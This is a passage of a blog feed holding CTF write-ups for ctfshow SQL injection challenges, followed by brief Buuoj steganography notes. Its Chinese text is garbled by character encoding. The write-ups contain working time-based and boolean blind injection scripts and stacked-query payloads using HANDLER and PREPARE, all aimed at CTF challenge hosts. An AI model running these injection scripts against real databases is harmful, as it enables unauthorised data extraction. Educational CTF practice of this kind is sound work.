class="line"></span><br></pre></td></tr></table></figure><p>å¾—åˆ°ç­”æ¡ˆ<code>&#125;2c15ff03675d-2cc9-fd04-a628-8c62925d&#123;wohsftc</code></p><p>éœ€è¦reverseä¸€ä¸‹ã€‚</p><h4><span id="web221">web221</span></h4><p><a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">limitæ³¨å…¥</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">procedure analyse(extractvalue(rand(),concat(<span class="number">0x3a</span>,database())),<span class="number">1</span>)</span><br><span class="line"><span class="number">10</span> procedure analyse(extractvalue(rand(),concat(<span class="number">0x3a</span>,database())),<span class="number">1</span>);</span><br></pre></td></tr></table></figure><h4><span id="web222">web222</span></h4><p>groupæ³¨å…¥ æˆ‘ä»¬å¯ä»¥è¿›è¡Œå»¶æ—¶ç›²æ³¨ä¹Ÿå¯ä»¥è¿›è¡Œå¸ƒå°”ç›²æ³¨</p><p>æˆ‘è¿™é‡Œç”¨å»¶æ—¶ç›²æ³¨</p><p>ä¾‹å¦‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group by if(1=1,sleep(1),1)</span><br></pre></td></tr></table></figure><blockquote><p>ä½†è¦æ³¨æ„çš„æ˜¯ï¼Œgroup byä¼šå‘ä¸‹ä¸€ç›´æŸ¥è¯¢ï¼Œæ•°æ®åº“é‡Œæ€»å…±æœ‰21æ¡æ•°æ®ï¼Œå¦‚æœæˆ‘ä»¬æ˜¯sleep(1)åˆ™æ˜¯åœé¡¿21ç§’</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    @Author disda</span></span><br><span class="line"><span class="string">    @Date 2023/6/9 14:54</span></span><br><span class="line"><span class="string">    @Describe</span></span><br><span class="line"><span class="string">    @Dependency</span></span><br><span class="line"><span class="string">    @Version 1.0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># @Author:Kradress</span></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f3a56ce4-76ff-448d-8baa-2ebba20cf55f.challenge.ctf.show/api/?u=&quot;</span></span><br><span class="line">url2 = <span class="string">&#x27; &amp;page=1&amp;limit=10&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span> <span class="comment"># ä¸­é—´æŒ‡é’ˆç­‰äºå¤´å°¾æŒ‡é’ˆç›¸åŠ çš„ä¸€åŠ</span></span><br><span class="line">        <span class="comment"># çˆ†è¡¨å</span></span><br><span class="line">        <span class="comment"># payload = f&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.05),&#x27;False&#x27;)&quot;</span></span><br><span class="line">        <span class="comment"># çˆ†åˆ—</span></span><br><span class="line">        <span class="comment"># payload = f&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flaga&#x27;),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.05),&#x27;False&#x27;)&quot;</span></span><br><span class="line">        <span class="comment"># çˆ†å€¼</span></span><br><span class="line">        payload = <span class="string">f&quot;if(ascii(substr((select group_concat(flagaabc) from ctfshow_flaga),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(0.05),&#x27;False&#x27;)&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url=url+payload+url2,timeout=<span class="number">1</span>).text</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            head = mid + <span class="number">1</span> <span class="comment">#sleepå¯¼è‡´è¶…æ—¶</span></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h4><span id="web223">web223</span></h4><blockquote><p>numToStr å‡½æ•°æ˜¯ä¸€ä¸ªè¾…åŠ©å‡½æ•°ï¼Œç”¨äºå°†ä¸€ä¸ªå­—ç¬¦ä¸²è½¬æ¢ä¸º SQL æŸ¥è¯¢è¯­å¥ä¸­çš„è¡¨è¾¾å¼ã€‚</p><p>è¯¥å‡½æ•°çš„åŸºæœ¬æ€æƒ³æ˜¯å°†æ¯ä¸ªå­—ç¬¦è½¬æ¢ä¸º true å€¼çš„åˆ—è¡¨ï¼Œè¿™ä¸ªåˆ—è¡¨çš„é•¿åº¦ä¸ºè¯¥å­—ç¬¦çš„ ASCII ç å€¼ã€‚ç„¶åå°†è¿™ä¸ª true å€¼çš„åˆ—è¡¨ä½œä¸ºå‚æ•°ä¼ é€’ç»™ char() å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šå°† true å€¼è½¬æ¢ä¸ºå¯¹åº”çš„ ASCII å­—ç¬¦ã€‚</p><p>ä¾‹å¦‚ï¼Œå¦‚æœè¾“å…¥å­—ç¬¦ä¸²æ˜¯ â€œaâ€ï¼Œåˆ™ numToStr(â€œaâ€) çš„ç»“æœæ˜¯ â€œchar(true,true,â€¦true)â€ï¼Œå…¶ä¸­ true çš„æ•°é‡ä¸º ASCII ç å€¼ â€œaâ€ çš„å€¼ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒASCII ç å€¼ â€œaâ€ çš„å€¼ä¸º 97ï¼Œå› æ­¤åˆ—è¡¨ä¸­æœ‰ 97 ä¸ª true å€¼ã€‚</p><p>è¿™ç§æ–¹æ³•çš„ä¼˜ç‚¹æ˜¯å¯ä»¥é¿å…ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œè¿™åœ¨æŸäº›æƒ…å†µä¸‹å¯ä»¥æé«˜æŸ¥è¯¢æ€§èƒ½ã€‚æ­¤å¤–ï¼Œä½¿ç”¨ true å€¼çš„åˆ—è¡¨ä¹Ÿé¿å…äº†å­—ç¬¦ä¸²è½¬ä¹‰çš„é—®é¢˜ã€‚</p><p>æ€»çš„æ¥è¯´ï¼ŒnumToStr å‡½æ•°æä¾›äº†ä¸€ä¸ªç®€å•è€Œæœ‰æ•ˆçš„æ–¹æ³•ï¼Œç”¨äºå°†å­—ç¬¦ä¸²è½¬æ¢ä¸º SQL æŸ¥è¯¢è¯­å¥ä¸­çš„è¡¨è¾¾å¼ã€‚</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    @Author disda</span></span><br><span class="line"><span class="string">    @Date 2023/6/9 16:17</span></span><br><span class="line"><span class="string">    @Describe </span></span><br><span class="line"><span class="string">    @Dependency</span></span><br><span class="line"><span class="string">    @Version 1.0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://a3d2e7a1-9073-4c14-a573-4e6ae2ea9e11.challenge.ctf.show/api/?u=&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">num2true</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;(&#x27;</span> + <span class="string">&#x27;true%2b&#x27;</span> * (num-<span class="number">1</span>) + <span class="string">&#x27;true)&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    head,tail = <span class="number">32</span>, <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail+<span class="number">1</span>) &gt;&gt; <span class="number">1</span>  <span class="comment"># ä¸­é—´æŒ‡é’ˆç­‰äºå¤´å°¾æŒ‡é’ˆç›¸åŠ çš„ä¸€åŠ</span></span><br><span class="line">        <span class="comment"># çˆ†è¡¨å</span></span><br><span class="line">        <span class="comment"># payload = f&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;num2true(i)&#125;,true))&lt;&#123;num2true(mid)&#125;,username,true)&quot;</span></span><br><span class="line">        <span class="comment"># çˆ†åˆ—</span></span><br><span class="line">        <span class="comment"># payload = f&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagas&#x27;),&#123;num2true(i)&#125;,true))&lt;&#123;num2true(mid)&#125;,username,true)&quot;</span></span><br><span class="line">        <span class="comment"># çˆ†å€¼</span></span><br><span class="line">        <span class="comment"># payload = f&quot;if(ascii(substr((select group_concat(flagasabc) from ctfshow_flagas),&#123;num2true(i)&#125;,true))&lt;&#123;num2true(mid)&#125;,username,true)&quot;</span></span><br><span class="line"></span><br><span class="line">        r = requests.get(url=url+payload).text</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;passwordAUTO&#x27;</span> <span class="keyword">in</span> r:</span><br><span class="line">            tail = mid-<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            head = mid</span><br><span class="line"></span><br><span class="line">    result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4><span id="web225">web225</span></h4><p><a href="https://www.freesion.com/article/79341469067/">ç”¨handleræ›¿ä»£select</a></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?username=&#x27;;show tables;%<span class="number">23</span></span><br><span class="line"></span><br><span class="line">?username=&#x27;;handler `ctfshow_flagasa` open as hd;handler hd read first;%<span class="number">23</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">GET /api/?username=&#x27;;show%20tables;--+ HTTP/1.1</span><br><span class="line">Host: 1a001d3e-f735-4f37-aa7a-f1d7bcfabb8c.challenge.ctf.show</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: http://1a001d3e-f735-4f37-aa7a-f1d7bcfabb8c.challenge.ctf.show/other.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=9oqrd401j58f8c21c1gge7p3gd</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">GET /api/?username=&#x27;;handler%20%60ctfshow_flagasa%60%20open%20as%20hd;handler%20hd%20read%20first;%2523 HTTP/1.1</span><br><span class="line">Host: 1a001d3e-f735-4f37-aa7a-f1d7bcfabb8c.challenge.ctf.show</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: http://1a001d3e-f735-4f37-aa7a-f1d7bcfabb8c.challenge.ctf.show/other.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=9oqrd401j58f8c21c1gge7p3gd</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4><span id="web226">web226</span></h4><p>é¢„ç¼–è¯‘</p><blockquote><p>prepareç”¨äºé¢„å¤‡ä¸€ä¸ªè¯­å¥ï¼Œå¹¶èµ‹äºˆåç§°ï¼Œä»¥åå¯ä»¥å¼•ç”¨è¯¥è¯­å¥<br>executeæ‰§è¡Œè¯­å¥<br>(deallocate|drop) prepare nameç”¨æ¥é‡Šæ”¾æ‰é¢„å¤„ç†çš„è¯­å¥(ä¹Ÿå¯ä»¥ä¸åŠ )</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x27;abc&#x27; ç­‰ä»·äºunhex(hex(6e6+382179)); å¯ä»¥ç”¨äºç»•è¿‡å¤§æ•°è¿‡æ»¤ï¼ˆå¤§æ•°è¿‡æ»¤ï¼š/\d&#123;9&#125;|0x[0-9a-f]&#123;9&#125;/iï¼‰</span><br><span class="line">å…·ä½“è½¬æ¢çš„æ­¥éª¤æ˜¯ï¼š</span><br><span class="line">  1. abcè½¬æˆ16è¿›åˆ¶æ˜¯616263</span><br><span class="line">  2. 616263è½¬åè¿›åˆ¶æ˜¯6382179</span><br><span class="line">  3. ç”¨ç§‘å­¦è®¡æ•°æ³•è¡¨ç¤º6e6+382179 </span><br><span class="line">  4. å¥—ä¸Šunhex(hex())ï¼Œå°±æ˜¯unhex(hex(6e6+382179));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># show tables</span><br><span class="line">?username=&#x27;;Prepare stmt from 0x73686F77207461626C6573;EXECUTE stmt;</span><br><span class="line"># select * from ctfsh_ow_flagas</span><br><span class="line">?username=&#x27;;Prepare stmt from 0x73656C656374202A2066726F6D2063746673685F6F775F666C61676173;EXECUTE stmt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/?username=&#x27;;Prepare%20stmt%20from%200x73686F77207461626C6573;EXECUTE%20stmt;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>619df01f-e0e2-42a2-b232-83a229284b6a.challenge.ctf.show</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://619df01f-e0e2-42a2-b232-83a229284b6a.challenge.ctf.show/other.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=b304b12mf4j5sdmt8lu0tjndgb</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/?username=&#x27;;Prepare%20stmt%20from%200x73656C656374202A2066726F6D2063746673685F6F775F666C61676173;EXECUTE%20stmt;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>619df01f-e0e2-42a2-b232-83a229284b6a.challenge.ctf.show</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://619df01f-e0e2-42a2-b232-83a229284b6a.challenge.ctf.show/other.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=b304b12mf4j5sdmt8lu0tjndgb</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4><span id="web227">web227</span></h4><p><a href="https://blog.csdn.net/qq_41573234/article/details/80411079">å­˜å‚¨è¿‡ç¨‹</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># SELECT * FROM information_schema.Routines</span><br><span class="line">&#x27;;prepare h from 0x53454c454354202a2046524f4d20696e666f726d6174696f6e5f736368656d612e526f7574696e6573;execute h;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/?username=&#x27;;prepare%20h%20from%200x53454c454354202a2046524f4d20696e666f726d6174696f6e5f736368656d612e526f7574696e6573;execute%20h;--+%0A#%20SELECT%20*%20FROM%20information_schema.Routines%0A&#x27;;%20call%20getFlag();--+</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>b06a0c07-d74f-4aa5-b2f9-ef4285bf3684.challenge.ctf.show</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://b06a0c07-d74f-4aa5-b2f9-ef4285bf3684.challenge.ctf.show/other.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=td89dg6cvb1nneqmfi4ktvgmna</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># select hex(&quot;select * from information_schema.routines&quot;)</span><br><span class="line">?username=&#x27;;Prepare stmt from 0x73656C656374202A2066726F6D20696E666F726D6174696F6E5F736368656D612E726F7574696E6573;EXECUTE stmt;%</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1><span id="æ„šäººèŠ‚æ¯">æ„šäººèŠ‚æ¯</span></h1><h2><span id="web">WEB</span></h2><h3><span id="easy_signin">easy_signin</span></h3><p>æŸ¥çœ‹æµè§ˆå™¨å‘ç°urlé“¾æ¥æ˜¯base64åŠ å¯†ã€‚<img src="https://img-blog.csdnimg.cn/img_convert/eea66e162a70efe45a115593662b2631.png" alt="image-20230404183149808"></p><p>base64è§£ç æ˜¯<code>face.png</code>ï¼Œå°è¯•<code>flag.txt</code>å’Œ<code>flag.php</code>ï¼Œbase64åŠ å¯†åä¼ å…¥éƒ½ä¸å¯¹ï¼Œç”¨<code>index.php</code>åŠ å¯†åä¼ å…¥ï¼Œçœ‹æºç ï¼Œç„¶åé€šè¿‡base64è§£å¯†ã€‚</p><p><img src="/2023/04/19/ctfshow-Web%E7%AF%87/image-20230419181149917.png" alt="image-20230419181149917"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="ctf" scheme="https://disda-coding.github.io/categories/ctf/"/>
    
    
    <category term="ctf" scheme="https://disda-coding.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Buuoj</title>
    <link href="https://disda-coding.github.io/2023/04/18/Buuoj/"/>
    <id>https://disda-coding.github.io/2023/04/18/Buuoj/</id>
    <published>2023-04-18T09:39:59.000Z</published>
    <updated>2023-04-19T00:19:24.239Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#misc">MISC</a><ul><li><a href="#%E9%87%91%E4%B8%89%E8%83%96">é‡‘ä¸‰èƒ–</a></li><li><a href="#%E4%BA%8C%E7%BB%B4%E7%A0%81">äºŒç»´ç </a></li></ul></li></ul><!-- tocstop --><h1><span id="misc">MISC</span></h1><h2><span id="é‡‘ä¸‰èƒ–">é‡‘ä¸‰èƒ–</span></h2><ul><li><p>å·¥å…·ï¼šstegsolve</p></li><li><p>ä½¿ç”¨æ–¹æ³•ï¼šä½¿ç”¨ Analyseâ€“&gt; frame browseræŸ¥çœ‹</p></li></ul><h2><span id="äºŒç»´ç ">äºŒç»´ç </span></h2><ul><li>å·¥å…·ï¼šbinwalk</li><li>ä½¿ç”¨æ–¹æ³• <code>binwalk -e qr.png</code>åˆ†ç¦»å‡ºä¸¤å¼ å›¾</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="ctf" scheme="https://disda-coding.github.io/categories/ctf/"/>
    
    
    <category term="ctf" scheme="https://disda-coding.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>ctf-bç«™ç¬”è®°</title>
    <link href="https://disda-coding.github.io/2023/04/13/ctf-b%E7%AB%99%E7%AC%94%E8%AE%B0/"/>
    <id>https://disda-coding.github.io/2023/04/13/ctf-b%E7%AB%99%E7%AC%94%E8%AE%B0/</id>
    <published>2023-04-13T07:32:21.000Z</published>
    <updated>2023-04-19T00:26:44.637Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#b%E7%AB%99%E7%BD%91%E5%AE%89%E8%AF%BE%E7%A8%8B">Bç«™ç½‘å®‰è¯¾ç¨‹</a></li><li><a href="#misc">Misc</a><ul><li><a href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B8%8E%E9%9A%90%E5%86%99">æ–‡ä»¶æ“ä½œä¸éšå†™</a><ul><li><a href="#%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E8%AF%86%E5%88%AB">æ–‡ä»¶ç±»å‹è¯†åˆ«</a></li><li><a href="#%E6%96%87%E4%BB%B6%E5%88%86%E7%A6%BB%E6%93%8D%E4%BD%9C">æ–‡ä»¶åˆ†ç¦»æ“ä½œ</a></li><li><a href="#%E6%96%87%E4%BB%B6%E5%90%88%E5%B9%B6%E6%93%8D%E4%BD%9C">æ–‡ä»¶åˆå¹¶æ“ä½œ</a></li></ul></li><li><a href="#%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99">å›¾ç‰‡éšå†™</a><ul><li><a href="#%E5%9B%BE%E7%89%87%E5%8A%A0%E5%AF%86">å›¾ç‰‡åŠ å¯†</a></li></ul></li><li><a href="#%E5%8E%8B%E7%BC%A9%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86">å‹ç¼©æ–‡ä»¶å¤„ç†</a><ul><li><a href="#%E5%88%A4%E6%96%AD%E4%BB%80%E4%B9%88%E5%8A%A0%E5%AF%86%E6%96%B9%E5%BC%8F">åˆ¤æ–­ä»€ä¹ˆåŠ å¯†æ–¹å¼</a></li></ul></li><li><a href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90">æµé‡åˆ†æ</a></li></ul></li><li><a href="#crypto">Crypto</a></li></ul><!-- tocstop --><h1><span id="bç«™ç½‘å®‰è¯¾ç¨‹">Bç«™ç½‘å®‰è¯¾ç¨‹</span></h1><p><a href="https://www.processon.com/view/link/62b1b2267d9c08073c671315">å­¦ä¹ è·¯çº¿å›¾</a></p><h1><span id="misc">Misc</span></h1><h2><span id="æ–‡ä»¶æ“ä½œä¸éšå†™">æ–‡ä»¶æ“ä½œä¸éšå†™</span></h2><h3><span 